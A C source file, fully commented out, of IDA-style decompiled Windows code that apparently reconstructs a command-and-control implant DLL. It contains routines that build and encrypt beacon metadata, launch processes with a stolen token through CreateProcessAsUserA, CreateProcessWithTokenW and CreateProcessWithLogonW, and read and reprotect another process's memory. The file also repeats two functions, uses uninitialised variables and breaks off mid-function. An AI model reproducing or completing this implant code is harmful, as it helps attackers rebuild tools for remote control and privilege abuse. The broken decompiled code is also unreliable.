//#include <Windows.h>
//#include "data_struct.h"
//#include "global.h"
//#include "data_deal.h"
//#include "function.h"
//#include "ida.h"
//DWORD dword_18003F410;
//QWORD qword_18003E460;
//HANDLE hToken;
//DWORD dword_18003C004;
//WORD word_18003F42C;
//QWORD unk_180044710;
//DWORD dword_18003F424;
//QWORD xmmword_18003F450;
//QWORD xmmword_18003F430;
//DWORD dword_18003F460;
//QWORD qword_180044750;
//QWORD unk_180045D10;
//QWORD unk_180045D70;
//QWORD qword_180045D88;
//QWORD dword_18003F428;
//QWORD xmmword_18003F440;
//
//DWORD env_extend(LPCSTR lpSrc, void* a2, size_t Size)
//{
//	
//	size_t v3; // rdi
//	DWORD v6; // eax
//	DWORD v7; // ebx
//
//	v3 = (unsigned int)Size;
//	v6 = ExpandEnvironmentStringsA(lpSrc, 0i64, 0);
//	v7 = v6;
//	if (!v6 || v6 + 1 >= (unsigned int)v3)
//		return 0;
//	memset(a2, 0, v3);
//	return ExpandEnvironmentStringsA(lpSrc, (LPSTR)a2, v7);
//}
//FARPROC __fastcall sub_180010988(DWORD_PTR* a1)
//{
//	HMODULE v2; // rax
//	FARPROC result; // rax
//
//	v2 = GetModuleHandleA("kernel32");
//	result = GetProcAddress(v2, "Wow64DisableWow64FsRedirection");
//	if (result)
//		result = (FARPROC)((__int64(__fastcall*)(DWORD_PTR*))result)(a1);
//	return result;
//}
//__int64 __fastcall sub_180014FEC(int a1)
//{
//	__int64 result; // rax
//
//	result = 1i64;
//	if (a1)
//	{
//		if (dword_18003F410 == 1)
//			result = 2i64;
//	}
//	else if (!dword_18003F410)
//	{
//		result = 0i64;
//	}
//	return result;
//}
//__int64 __fastcall sub_18000C71C(char* Str, _QWORD* a2)
//{
//	__int64 i; // rbx
//	__int64 result; // rax
//
//	for (i = qword_18003E460; i; i = *(_QWORD*)(i + 16392))
//	{
//		if (*(_DWORD*)i == 1 && strstr(Str, (const char*)(i + 4)) == Str)
//		{
//			//change
//			a2[1] = (QWORD)Str;
//			result = 1i64;
//			*a2 = i + 8196;
//			return result;
//		}
//	}
//	return 0i64;
//}
//void* __fastcall sub_18000CEF0(__int64 a1, void* a2, int a3)
//{
//	*(_DWORD*)(a1 + 16) = 0;
//	//change
//	*(_QWORD*)a1 = (DWORD_PTR)a2;
//	*(_QWORD*)(a1 + 8) = (DWORD_PTR)a2;
//	*(_DWORD*)(a1 + 20) = a3;
//	return memset(a2, 0, a3);
//}
//
////__int64 __fastcall sub_18000CF34(__int64 a1, unsigned int a2)
//void* __fastcall sub_18000CF34(__int64 a1, unsigned int a2)
//{
//	void* v4; // rax
//
//	v4 = malloc((int)a2);
//	//change
//	return sub_18000CEF0((DWORD_PTR)a1, v4, a2);
//}
//unsigned __int64 __fastcall sub_18000CEA8(__int64 a1, const void* a2, int a3)
//{
//	__int64 v3; // rsi
//	unsigned __int64 result; // rax
//
//	v3 = a3;
//	result = (unsigned int)(*(_DWORD*)(a1 + 20) - *(_DWORD*)(a1 + 16));
//	if (a3 < (int)result)
//	{
//		if (a3)
//		{
//			result = (unsigned __int64)memmove(*(void**)(a1 + 8), a2, a3);
//			*(_QWORD*)(a1 + 8) += v3;
//			*(_DWORD*)(a1 + 16) += v3;
//		}
//	}
//	return result;
//}
//unsigned __int64 __fastcall sub_18000CEA8(__int64 a1, const void* a2, int a3)
//{
//	__int64 v3; // rsi
//	unsigned __int64 result; // rax
//
//	v3 = a3;
//	result = (unsigned int)(*(_DWORD*)(a1 + 20) - *(_DWORD*)(a1 + 16));
//	if (a3 < (int)result)
//	{
//		if (a3)
//		{
//			result = (unsigned __int64)memmove(*(void**)(a1 + 8), a2, a3);
//			*(_QWORD*)(a1 + 8) += v3;
//			*(_DWORD*)(a1 + 16) += v3;
//		}
//	}
//	return result;
//}
//__int64 __fastcall sub_180013E74(__int64 a1)
//{
//	return *(unsigned int*)(a1 + 16);
//}
//__int64 __fastcall sub_18000D000(__int64 a1)
//{
//	return *(_QWORD*)a1;
//}
//unsigned __int64 __fastcall sub_18000CF64(__int64 a1, u_long hostlong)
//{
//	hostlong = htonl(hostlong);
//	return sub_18000CEA8((DWORD_PTR)a1, &hostlong, 4);
//}
//__int64 __fastcall sub_18000D8DC(__int64 a1)
//{
//	return (unsigned int)(*(_DWORD*)(a1 + 8) + 4);
//}
//
//__int64 __fastcall sub_1800040F4(unsigned int a1)
//{
//	__int64 result; // rax
//
//	if (a1 <= 0x1F && *((_QWORD*)&unk_180044710 + 22 * (int)a1))
//		result = 0i64;
//	else
//		result = 10i64;
//	return result;
//}
//
//__int64 __fastcall sub_1800013A4(signed int a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, _DWORD* a6)
//{
//	__int64 v6; // rbp
//	__int64 result; // rax
//	unsigned int v9; // er10
//	__int64 v10; // r11
//	int v11; // ebx
//	int v12; // eax
//	_BYTE* v13; // rcx
//	__int64 v14; // rsi
//
//	v6 = a1;
//	result = sub_1800040F4(a1);
//	v11 = 0;
//	if (!(_DWORD)result)
//	{
//		result = (*((__int64(__fastcall**)(__int64, _QWORD, _QWORD, _DWORD*)) & unk_180044710 + 22 * v6 + 4))(
//			v10,
//			v9,
//			a5,
//			a6 + 34);
//		if (!(_DWORD)result)
//		{
//			v12 = *((_DWORD*)&unk_180044710 + 44 * v6 + 5);
//			*a6 = v6;
//			a6[1] = v12;
//			if (v12 > 0)
//			{
//				//change
//				v13 = (BYTE*)a6 + 2;
//				v14 = a2 - (_QWORD)a6;
//				do
//				{
//					++v11;
//					*v13 = v13[v14 - 8];
//					++v13;
//				} while (v11 < a6[1]);
//			}
//			result = 0i64;
//		}
//	}
//	return result;
//}
//__int64 __fastcall sub_180001448(__int64 a1, __int64 a2, int a3, unsigned int* a4)
//{
//	__int64 result; // rax
//	unsigned int v9; // er8
//	int* v10; // r9
//	__int64 v11; // rcx
//	unsigned int v12; // edx
//	__int64 v13; // r8
//	__int64(__fastcall * v14)(__int64, __int64, __int64, int*, int*); // r10
//	int* v15; // r14
//	signed int v16; // edx
//	int* v17; // rcx
//	signed int v18; // edx
//	int* v19; // rcx
//
//	result = sub_1800040F4(*a4);
//	if (!(_DWORD)result)
//	{
//		LODWORD(v11) = v10[1];
//		if ((unsigned int)(v11 - 1) > 0x7F
//			|| (v12 = v9 % (unsigned int)v11, v13 = v9 / (unsigned int)v11, v12)
//			|| (v11 & 3) != 0)
//		{
//			result = 16i64;
//		}
//		else
//		{
//			v14 = (__int64(__fastcall*)(__int64, __int64, __int64, int*, int*)) * ((_QWORD*)&unk_180044710 + 22 * *v10 + 12);
//			if (v14)
//			{
//				result = v14(a1, a2, v13, v10 + 2, v10 + 34);
//			}
//			else if (a3)
//			{
//				v15 = v10 + 2;
//				while (1)
//				{
//					v16 = 0;
//					if ((int)v11 > 0)
//					{
//						v17 = v15;
//						do
//						{
//							v16 += 4;
//							*v17 ^= *(int*)((char*)v17 + a1 - (_QWORD)a4 - 8);
//							++v17;
//						} while (v16 < (int)a4[1]);
//					}
//					result = (*((__int64(__fastcall**)(int*, __int64, unsigned int*)) & unk_180044710 + 22 * (int)*a4 + 5))(
//						v15,
//						a2,
//						a4 + 34);
//					if ((_DWORD)result)
//						break;
//					v18 = 0;
//					if ((int)a4[1] > 0)
//					{
//						v19 = v15;
//						do
//						{
//							v18 += 4;
//							*v19 = *(int*)((char*)v19 + a2 - (_QWORD)a4 - 8);
//							++v19;
//						} while (v18 < (int)a4[1]);
//					}
//					v11 = (int)a4[1];
//					a2 += v11;
//					a1 += v11;
//					a3 -= v11;
//					if (!a3)
//						goto LABEL_17;
//				}
//			}
//			else
//			{
//			LABEL_17:
//				result = 0i64;
//			}
//		}
//	}
//	return result;
//}
//__int64 __fastcall sub_1800016C0(unsigned int* a1)
//{
//	__int64 result; // rax
//	int* v2; // rdx
//
//	result = sub_1800040F4(*a1);
//	if (!(_DWORD)result)
//	{
//		qword_180044750[22 * *v2](v2 + 34);
//		result = 0i64;
//	}
//	return result;
//}
//__int64 __fastcall sub_18000411C(unsigned int a1)
//{
//	__int64 result; // rax
//
//	if (a1 <= 0x1F && *((_QWORD*)&unk_180045D10 + 16 * (__int64)(int)a1))
//		result = 0i64;
//	else
//		result = 11i64;
//	return result;
//}
//__int64 __fastcall sub_1800018BC(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4, unsigned int* a5)
//{
//	__int64 result; // rax
//	__int64 v9; // r10
//	__int64 v10; // rdi
//	unsigned int v11; // eax
//	void* v12; // rax
//	void* v13; // rbx
//	unsigned int v14; // esi
//
//	result = sub_18000411C(a1);
//	if (!(_DWORD)result)
//	{
//		v10 = v9 << 7;
//		v11 = *((_DWORD*)&unk_180045D10 + 32 * v9 + 3);
//		if (*a5 >= v11)
//		{
//			v12 = malloc(0x70ui64);
//			v13 = v12;
//			if (v12)
//			{
//				v14 = (*(__int64(__fastcall**)(void*))((char*)&unk_180045D10 + v10 + 88))(v12);
//				if (!v14)
//				{
//					v14 = (*(__int64(__fastcall**)(void*, __int64, _QWORD))((char*)&unk_180045D10 + v10 + 96))(v13, a2, a3);
//					if (!v14)
//					{
//						v14 = (*(__int64(__fastcall**)(void*, __int64))((char*)&unk_180045D10 + v10 + 104))(v13, a4);
//						*a5 = *(_DWORD*)((char*)&unk_180045D10 + v10 + 12);
//					}
//				}
//				free(v13);
//				result = v14;
//			}
//			else
//			{
//				result = 13i64;
//			}
//		}
//		else
//		{
//			*a5 = v11;
//			result = 6i64;
//		}
//	}
//	return result;
//}
//void* __fastcall sub_1800040DC(void* a1, size_t a2)
//{
//	void* result; // rax
//
//	if (a2)
//		result = memset(a1, 0, a2);
//	return result;
//}
//__int64 __fastcall sub_180004300(__int64 a1, signed int a2, const void* a3, unsigned int a4)
//{
//	__int64 v5; // rbp
//	size_t v6; // rdi
//	__int64 result; // rax
//	int v9; // er9
//	__int64 v10; // rbx
//	__int64 v11; // r15
//	size_t v12; // r12
//	void* v13; // r14
//	void* v14; // rax
//	unsigned int v15; // edi
//	unsigned int v16; // eax
//	unsigned int v17; // eax
//	void* v18; // rcx
//	unsigned int v19; // eax
//	__int64 i; // r8
//	unsigned int v21[4]; // [rsp+30h] [rbp-38h] BYREF
//
//	v5 = a2;
//	v6 = a4;
//	result = sub_18000411C(a2);
//	if (!(_DWORD)result)
//	{
//		*(_DWORD*)(a1 + 112) = v5;
//		v10 = v5 << 7;
//		v11 = *((unsigned int*)&unk_180045D10 + 32 * v5 + 3);
//		if (!v9)
//			return 3i64;
//		v12 = *(unsigned int*)((char*)&unk_180045D10 + v10 + 16);
//		v13 = malloc(v12);
//		if (!v13)
//			return 13i64;
//		v14 = malloc(v12);
//		*(_QWORD*)(a1 + 232) = v14;
//		if (!v14)
//		{
//			v15 = 13;
//		LABEL_20:
//			free(v13);
//			return v15;
//		}
//		if ((unsigned int)v6 <= *(_DWORD*)((char*)&unk_180045D10 + v10 + 16))
//		{
//			memmove(v14, a3, v6);
//			v19 = *(_DWORD*)((char*)&unk_180045D10 + v10 + 16);
//			if ((unsigned int)v6 >= v19)
//				goto LABEL_15;
//			v17 = v19 - v6;
//			v18 = (void*)(v6 + *(_QWORD*)(a1 + 232));
//		}
//		else
//		{
//			v21[0] = *(_DWORD*)((char*)&unk_180045D10 + v10 + 16);
//			v15 = sub_1800018BC(v5, (__int64)a3, v6, (__int64)v14, v21);
//			if (v15)
//			{
//			LABEL_19:
//				free(*(void**)(a1 + 232));
//				goto LABEL_20;
//			}
//			v16 = *(_DWORD*)((char*)&unk_180045D10 + v10 + 16);
//			if ((unsigned int)v11 >= v16)
//			{
//			LABEL_15:
//				for (i = 0i64; (unsigned int)i < *(_DWORD*)((char*)&unk_180045D10 + v10 + 16); i = (unsigned int)(i + 1))
//					*((_BYTE*)v13 + i) = *(_BYTE*)(*(_QWORD*)(a1 + 232) + i) ^ 0x36;
//				v15 = (*(__int64(__fastcall**)(__int64))((char*)&unk_180045D10 + v10 + 88))(a1);
//				if (!v15)
//				{
//					v15 = (*(__int64(__fastcall**)(__int64, void*, _QWORD))((char*)&unk_180045D10 + v10 + 96))(
//						a1,
//						v13,
//						*(unsigned int*)((char*)&unk_180045D10 + v10 + 16));
//					if (!v15)
//						goto LABEL_20;
//				}
//				goto LABEL_19;
//			}
//			v17 = v16 - v11;
//			v18 = (void*)(*(_QWORD*)(a1 + 232) + v11);
//		}
//		sub_1800040DC(v18, v17);
//		goto LABEL_15;
//	}
//	return result;
//}
//__int64 __fastcall sub_180004140(__int64 a1)
//{
//	__int64 result; // rax
//	__int64 v2; // r9
//
//	result = sub_18000411C(*(_DWORD*)(a1 + 112));
//	if (!(_DWORD)result)
//		result = (*((__int64(__fastcall**)(__int64)) & unk_180045D70 + 16 * (__int64)*(int*)(v2 + 112)))(v2);
//	return result;
//}
//__int64 __fastcall sub_180004170(__int64 a1, _BYTE* a2, unsigned int* a3)
//{
//	__int64 result; // rax
//	__int64 v7; // rdi
//	unsigned int v8; // er12
//	_BYTE* v9; // r14
//	void* v10; // rax
//	void* v11; // rbp
//	unsigned int v12; // ebx
//	__int64 i; // r8
//	unsigned int v14; // ecx
//	__int64 v15; // rdx
//
//	result = sub_18000411C(*(_DWORD*)(a1 + 112));
//	if ((_DWORD)result)
//		return result;
//	v7 = (__int64)*(int*)(a1 + 112) << 7;
//	v8 = *(_DWORD*)((char*)&unk_180045D10 + v7 + 12);
//	v9 = malloc(*(unsigned int*)((char*)&unk_180045D10 + v7 + 16));
//	v10 = malloc(v8);
//	v11 = v10;
//	if (v9)
//	{
//		if (v10)
//		{
//			v12 = (*(__int64(__fastcall**)(__int64, void*))((char*)&unk_180045D10 + v7 + 104))(a1, v10);
//			if (!v12)
//			{
//				for (i = 0i64; (unsigned int)i < *(_DWORD*)((char*)&unk_180045D10 + v7 + 16); i = (unsigned int)(i + 1))
//					v9[i] = *(_BYTE*)(*(_QWORD*)(a1 + 232) + i) ^ 0x5C;
//				v12 = (*(__int64(__fastcall**)(__int64))((char*)&unk_180045D10 + v7 + 88))(a1);
//				if (!v12)
//				{
//					v12 = (*(__int64(__fastcall**)(__int64, _BYTE*, _QWORD))((char*)&unk_180045D10 + v7 + 96))(
//						a1,
//						v9,
//						*(unsigned int*)((char*)&unk_180045D10 + v7 + 16));
//					if (!v12)
//					{
//						v12 = (*(__int64(__fastcall**)(__int64, void*, _QWORD))((char*)&unk_180045D10 + v7 + 96))(a1, v11, v8);
//						if (!v12)
//						{
//							v12 = (*(__int64(__fastcall**)(__int64, _BYTE*))((char*)&unk_180045D10 + v7 + 104))(a1, v9);
//							if (!v12)
//							{
//								v14 = 0;
//								if (v8)
//								{
//									v15 = v9 - a2;
//									do
//									{
//										if (v14 >= *a3)
//											break;
//										++v14;
//										*a2 = a2[v15];
//										++a2;
//									} while (v14 < v8);
//								}
//								*a3 = v14;
//								v12 = 0;
//							}
//						}
//					}
//				}
//			}
//			free(*(void**)(a1 + 232));
//			free(v11);
//			free(v9);
//			return v12;
//		}
//		free(v9);
//	}
//	if (v11)
//		free(v11);
//	return 13i64;
//}
//__int64 __fastcall sub_18000198C(signed int a1, const void* a2, unsigned int a3, __int64 a4, unsigned int a5, _BYTE* a6, unsigned int* a7)
//{
//	__int64 v7; // rdi
//	__int64 result; // rax
//	__int64(__fastcall * v12)(const void*, _QWORD, __int64, _QWORD, _BYTE*, unsigned int*); // r10
//	void* v13; // rax
//	void* v14; // rbx
//	unsigned int v15; // edi
//
//	v7 = a1;
//	result = sub_18000411C(a1);
//	if (!(_DWORD)result)
//	{
//		v12 = (__int64(__fastcall*)(const void*, _QWORD, __int64, _QWORD, _BYTE*, unsigned int*))qword_180045D88[16 * v7];
//		if (v12)
//		{
//			result = v12(a2, a3, a4, a5, a6, a7);
//		}
//		else
//		{
//			v13 = malloc(0xF0ui64);
//			v14 = v13;
//			if (v13)
//			{
//				v15 = sub_180004300((__int64)v13, v7, a2, a3);
//				if (!v15)
//				{
//					v15 = sub_180004140((__int64)v14);
//					if (!v15)
//						v15 = sub_180004170((__int64)v14, a6, a7);
//				}
//				free(v14);
//				result = v15;
//			}
//			else
//			{
//				result = 13i64;
//			}
//		}
//	}
//	return result;
//}
//
//__int64 __fastcall sub_1800183C0(__int64 a1, signed int a2)
//{
//	signed int v2; // ebx
//	int i; // eax
//	unsigned int v6; // [rsp+68h] [rbp+10h] BYREF
//
//	v2 = a2;
//	v6 = 16;
//	for (i = a2 % 16; i; ++i)
//	{
//		if (i >= 16)
//			break;
//		++v2;
//	}
//	if (word_18003F42C)
//	{
//		if (word_18003F42C != 1)
//			exit(1);
//	}
//	else
//	{
//		if ((unsigned int)sub_1800013A4(
//			dword_18003F424,
//			(__int64)&xmmword_18003F450,
//			(__int64)&xmmword_18003F430,
//			16i64,
//			0,
//			dword_18003F460))
//			exit(1);
//		if ((unsigned int)sub_180001448(a1, a1, v2, dword_18003F460))
//			exit(1);
//		if ((unsigned int)sub_1800016C0(dword_18003F460))
//			exit(1);
//	}
//	if ((unsigned int)sub_18000198C(dword_18003F428, &xmmword_18003F440, 0x10u, a1, v2, (_BYTE*)(a1 + v2), &v6))
//		exit(1);
//	return (unsigned int)(v2 + 16);
//}
//
//u_long* __fastcall sub_18000DA44(const void* a1, int a2, unsigned int a3, _DWORD* a4)
//{
//	int v4; // ebp
//	u_long* v9; // rax
//	u_long* v10; // rbx
//	signed int v12; // eax
//	int v13[10]; // [rsp+20h] [rbp-28h] BYREF
//
//	v4 = a2 + 48;
//	v9 = (u_long*)malloc(a2 + 48);
//	v10 = v9;
//	if (!v9)
//		goto LABEL_2;
//	init_struc3((__int64)v13, v9, v4);
//	push_dowrd_struc3(v13, a3);
//	push_N_struc3(v13, a1, a2);
//	v12 = sub_18000D8DC((__int64)v13);
//	if (v12 <= 0)
//	{
//		free(v10);
//	LABEL_2:
//		*a4 = 0;
//		return 0i64;
//	}
//	*a4 = sub_1800183C0((__int64)v10, v12);
//	return v10;
//}
//
//void __fastcall sub_18000CE3C(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
//{
//	u_long* v5; // rax
//	u_long* v6; // rbx
//	unsigned int v7[6]; // [rsp+20h] [rbp-18h] BYREF
//
//	v7[0] = 0;
//	v5 = sub_18000DA44((const void*)a1, a2, a3, v7);
//	v6 = v5;
//	if (v7[0])
//	{
//		if (dword_18003C004 == 1)
//			sub_18000E3D4(Buffer, v5, v7[0], a4);
//		free(v6);
//	}
//}
//unsigned int __fastcall sub_18000E3D4(const char* a1, const void* a2, int a3, int a4)
//{
//	size_t v5; // rbx
//	unsigned int result; // eax
//	u_long v9; // eax
//	char* v10; // rdx
//
//	v5 = a3;
//	if (!Globa_unknown_data)
//		Globa_unknown_data = malloc(0x200000ui64);
//	result = v5 + 4;
//	if (v5 + 4 <= 0x200000)
//	{
//		if ((unsigned __int64)((int)v5 + Globala6 + 4i64) > 0x200000)
//			sned_generate_Metadata(a1);
//		v9 = htonl(v5);
//		v10 = (char*)Globa_unknown_data;
//		*(_DWORD*)((char*)Globa_unknown_data + Globala6) = v9;
//		Globala6 += 4;
//		result = (unsigned int)memmove(&v10[Globala6], a2, v5);
//		Globala6 += v5;
//		if (a4)
//			result = sned_generate_Metadata(a1);
//	}
//	return result;
//}
//void __fastcall sub_18000CF10(__int64 a1)
//{
//	memset(*(void**)a1, 0, *(int*)(a1 + 20));
//	free(*(void**)a1);
//}
//void __fastcall sub_18000D908(const void* a1, int a2, u_long a3)
//{
//	int v6; // er14
//	int v7; // edi
//	__int64 v8; // rsi
//	unsigned int v9; // ebx
//	__int64 v10; // rax
//	unsigned int v11; // ebx
//	char v12[40]; // [rsp+20h] [rbp-28h] BYREF
//
//	v6 = get_DWORD(0x1Cu);
//	sub_18000CF34((__int64)v12, 2 * v6);
//	sub_18000CF64((__int64)v12, a2 + 4);
//	sub_18000CF64((__int64)v12, a3);
//	v7 = v6 - 8;
//	sub_18000CEA8((__int64)v12, a1, v6 - 8);
//	v8 = (__int64)a1 + v6 - 8;
//	v9 = sub_180013E74((__int64)v12);
//	v10 = sub_18000D000((__int64)v12);
//	sub_18000CE3C(v10, v9, 28i64, 1u);
//	sub_18000CF10((__int64)v12);
//	while (v7 < a2)
//	{
//		v11 = a2 - v7;
//		if (a2 - v7 > v6)
//			v11 = v6;
//		sub_18000CE3C(v8, v11, 29i64, 1u);
//		v8 += (int)v11;
//		v7 += v11;
//	}
//}
//void __fastcall sub_18000D9F4(__int64 a1, unsigned int a2, unsigned int a3)
//{
//	if (a2 <= (unsigned int)get_DWORD(0x1Cu))
//		sub_18000CE3C(a1, a2, a3, 1u);
//	else
//		sub_18000D908((const void*)a1, a2, a3);
//}
//
//__int64 __fastcall sub_18000CDD8(__int64 a1, unsigned int a2, unsigned int a3)
//{
//	BOOL v6; // ecx
//	__int64 result; // rax
//
//	v6 = get_DWORD(0x1Cu) != 0;
//	if (dword_18003C004 == 1 && v6)
//		result = sub_18000D9F4(a1, a2, a3);
//	else
//		result = sub_18000CE3C(a1, a2, a3, 0i64);
//	return result;
//}
//void __fastcall sub_18000DB74(unsigned int a1, unsigned int a2, unsigned int a3, __int64 a4)
//{
//	__int64 v8; // r8
//	unsigned int v9; // ebx
//	__int64 v10; // rax
//	char v11[40]; // [rsp+20h] [rbp-28h] BYREF
//
//	sub_18000CF34((__int64)v11, 0x800u);
//	sub_18000CF64((__int64)v11, a1);
//	sub_18000CF64((__int64)v11, a2);
//	sub_18000CF64((__int64)v11, a3);
//	if (a4)
//	{
//		v8 = -1i64;
//		do
//			++v8;
//		while (*(_BYTE*)(v8 + a4));
//		sub_18000CEA8((__int64)v11, (const void*)a4, v8);
//	}
//	v9 = sub_180013E74((__int64)v11);
//	v10 = sub_18000D000((__int64)v11);
//	sub_18000CDD8(v10, v9, 0x1Fu);
//	sub_18000CF10((__int64)v11);
//}
//__int64 __fastcall sub_18000DC4C(unsigned int a1, __int64 a2, unsigned int a3)
//{
//	return sub_18000DB74(a1, a3, 0, a2);
//}
//__int64 __fastcall sub_18000FB58(__int64 a1, WCHAR* a2, const WCHAR* a3)
//{
//	unsigned int v5; // eax
//
//	if (CreateProcessWithLogonW(
//		lpWideCharStr,
//		lpDomain,
//		lpPassword,
//		2u,
//		0i64,
//		a2,
//		*(_DWORD*)(a1 + 32),
//		0i64,
//		a3,
//		*(LPSTARTUPINFOW*)(a1 + 16),
//		*(LPPROCESS_INFORMATION*)(a1 + 24)))
//	{
//		return 1i64;
//	}
//	v5 = GetLastError();
//	sub_18000DC4C(0x45u, *(_QWORD*)a1, v5);
//	return 0i64;
//}
//void __fastcall sub_18000DB74(unsigned int a1, unsigned int a2, unsigned int a3, __int64 a4)
//{
//	__int64 v8; // r8
//	unsigned int v9; // ebx
//	__int64 v10; // rax
//	char v11[40]; // [rsp+20h] [rbp-28h] BYREF
//
//	sub_18000CF34((__int64)v11, 0x800u);
//	sub_18000CF64((__int64)v11, a1);
//	sub_18000CF64((__int64)v11, a2);
//	sub_18000CF64((__int64)v11, a3);
//	if (a4)
//	{
//		v8 = -1i64;
//		do
//			++v8;
//		while (*(_BYTE*)(v8 + a4));
//		sub_18000CEA8((__int64)v11, (const void*)a4, v8);
//	}
//	v9 = sub_180013E74((__int64)v11);
//	v10 = sub_18000D000((__int64)v11);
//	sub_18000CDD8(v10, v9, 0x1Fu);
//	sub_18000CF10((__int64)v11);
//}
//__int64 __fastcall sub_18000DB60(__int64 a1, __int64 a2)
//{
//	return sub_18000DB74(a1, a2, 0i64, 0i64);
//}
//__int64 __fastcall sub_18000F03C(LPCCH lpMultiByteStr, LPWSTR lpWideCharStr, int a3)
//{
//	unsigned __int64 cchWideChar; // rbx
//	int v6; // eax
//
//	cchWideChar = a3;
//	v6 = MultiByteToWideChar(0, 0, lpMultiByteStr, -1, 0i64, 0);
//	if (v6 == -1i64 || v6 >= cchWideChar)
//		return 0i64;
//	MultiByteToWideChar(0, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);
//	return 1i64;
//}
//__int64 __fastcall sub_18000FBD8(LPCCH* a1)
//{
//	WCHAR* lpCurrentDirectory; // rdi
//	unsigned int v4; // eax
//	unsigned int v5; // ecx
//	WCHAR CommandLine; // [rsp+50h] [rbp-1008h] BYREF
//	char v7[2046]; // [rsp+52h] [rbp-1006h] BYREF
//	WCHAR Buffer; // [rsp+850h] [rbp-808h] BYREF
//	char v9[2046]; // [rsp+852h] [rbp-806h] BYREF
//
//	CommandLine = 0;
//	memset(v7, 0, sizeof(v7));
//	Buffer = 0;
//	memset(v9, 0, sizeof(v9));
//	*((_QWORD*)a1[2] + 2) = 0i64;
//	lpCurrentDirectory = 0i64;
//	if ((unsigned int)sub_18000F03C(*a1, &CommandLine, 1024))
//	{
//		if (GetCurrentDirectoryW(0, 0i64) < 0x400)
//		{
//			GetCurrentDirectoryW(0x400u, &Buffer);
//			lpCurrentDirectory = &Buffer;
//		}
//		if (CreateProcessWithTokenW(
//			hToken,
//			2u,
//			0i64,
//			&CommandLine,
//			*((_DWORD*)a1 + 8),
//			0i64,
//			lpCurrentDirectory,
//			(LPSTARTUPINFOW)a1[2],
//			(LPPROCESS_INFORMATION)a1[3]))
//		{
//			return 1i64;
//		}
//		if (GetLastError() == 1314 && CreateProcessWithLogonW && dword_180043468 == 1)
//			return sub_18000FB58((__int64)a1, &CommandLine, lpCurrentDirectory);
//		if (GetLastError() == 87 && *(_DWORD*)a1[2] == 112 && CreateProcessWithLogonW)
//		{
//			v4 = GetLastError();
//			v5 = 74;
//		}
//		else
//		{
//			v4 = GetLastError();
//			v5 = 41;
//		}
//		sub_18000DC4C(v5, (__int64)*a1, v4);
//	}
//	else
//	{
//		sub_18000DB60(7i64, *((unsigned int*)a1 + 2));
//	}
//	return 0i64;
//}
//__int64 __fastcall sub_18000F830(_QWORD* a1)
//{
//	DWORD v3; // eax
//	__int64 v4; // rcx
//
//	if (!hToken || *((_DWORD*)a1 + 9))
//	{
//		if (!CreateProcessA(
//			0i64,
//			(LPSTR)*a1,
//			0i64,
//			0i64,
//			1,
//			*((_DWORD*)a1 + 8),
//			0i64,
//			0i64,
//			(LPSTARTUPINFOA)a1[2],
//			(LPPROCESS_INFORMATION)a1[3]))
//		{
//			v3 = GetLastError();
//			v4 = 48i64;
//		LABEL_8:
//			sub_18000DC4C(v4, *a1, v3);
//			return 0i64;
//		}
//	}
//	else if (!CreateProcessAsUserA(
//		hToken,
//		0i64,
//		(LPSTR)*a1,
//		0i64,
//		0i64,
//		1,
//		*((_DWORD*)a1 + 8),
//		0i64,
//		0i64,
//		(LPSTARTUPINFOA)a1[2],
//		(LPPROCESS_INFORMATION)a1[3]))
//	{
//		if (GetLastError() == 1314 && &CreateProcessWithTokenW)
//			return sub_18000FBD8(a1);
//		v3 = GetLastError();
//		v4 = 41i64;
//		goto LABEL_8;
//	}
//	return 1i64;
//}
//__int64 __fastcall sub_18000DC2C(unsigned int a1)
//{
//	return sub_18000DB74(a1, 0, 0, 0i64);
//}
//__int64 sub_18000F5A8()
//{
//	return 1i64;
//}
//__int64 __fastcall sub_18000F560(__int64 a1)
//{
//	HMODULE v2; // rax
//	BOOL(__stdcall * IsWow64Process)(HANDLE, PBOOL); // rax
//	__int64 result; // rax
//	unsigned int v5; // [rsp+38h] [rbp+10h] BYREF
//
//	v5 = 0;
//	v2 = GetModuleHandleA("kernel32");
//	IsWow64Process = (BOOL(__stdcall*)(HANDLE, PBOOL))GetProcAddress(v2, "IsWow64Process");
//	if (!IsWow64Process
//		|| (result = ((__int64(__fastcall*)(__int64, unsigned int*))IsWow64Process)(a1, &v5), (_DWORD)result))
//	{
//		result = v5;
//	}
//	return result;
//}
//__int64 __fastcall sub_1800168E4(__int64 a1)
//{
//	unsigned int v2; // ebx
//	HANDLE v3; // rax
//	__int64 result; // rax
//
//	v2 = 0;
//	if ((unsigned int)sub_18000F5A8() || (v3 = GetCurrentProcess(), result = sub_18000F560((__int64)v3), (_DWORD)result))
//	{
//		LOBYTE(v2) = (unsigned int)sub_18000F560(a1) == 0;
//		result = v2;
//	}
//	return result;
//}
//__int64 __fastcall sub_18000F934(__int64 a1, __int64 a2)
//{
//	HANDLE v3; // rcx
//	void* v6; // rcx
//	DWORD v7; // eax
//	unsigned int v8; // ebx
//	void* v9; // rsi
//	DWORD v10; // eax
//	__int16 v11; // [rsp+30h] [rbp-D0h] BYREF
//	_BYTE lpAddress[14]; // [rsp+32h] [rbp-CEh]
//	struct _CONTEXT Context; // [rsp+40h] [rbp-C0h] BYREF
//	DWORD flOldProtect; // [rsp+540h] [rbp+440h] BYREF
//	SIZE_T NumberOfBytesWritten; // [rsp+550h] [rbp+450h] BYREF
//	__int64 Buffer; // [rsp+558h] [rbp+458h] BYREF
//
//	v3 = *(HANDLE*)a1;
//	*(_QWORD*)lpAddress = 0i64;
//	*(_DWORD*)&lpAddress[8] = 0;
//	*(_WORD*)&lpAddress[12] = 0;
//	v11 = 0;
//	if (!(unsigned int)sub_1800168E4(v3))
//	{
//		sub_18000DC2C(67i64);
//		return 0i64;
//	}
//	v6 = *(void**)(a1 + 8);
//	Context.ContextFlags = 1048578;
//	if (!GetThreadContext(v6, &Context)
//		|| !ReadProcessMemory(*(HANDLE*)a1, (LPCVOID)(Context.Rdx + 32), &Buffer, 8ui64, 0i64)
//		|| !ReadProcessMemory(*(HANDLE*)a1, (LPCVOID)(Buffer + 112), &v11, 0x10ui64, 0i64)
//		|| !VirtualProtectEx(*(HANDLE*)a1, *(LPVOID*)&lpAddress[6], *(unsigned __int16*)lpAddress, 4u, &flOldProtect))
//	{
//		v7 = GetLastError();
//		sub_18000DB60(65i64, v7);
//		return 0i64;
//	}
//	v8 = *(unsigned __int16*)lpAddress;
//	v9 = malloc(*(unsigned __int16*)lpAddress);
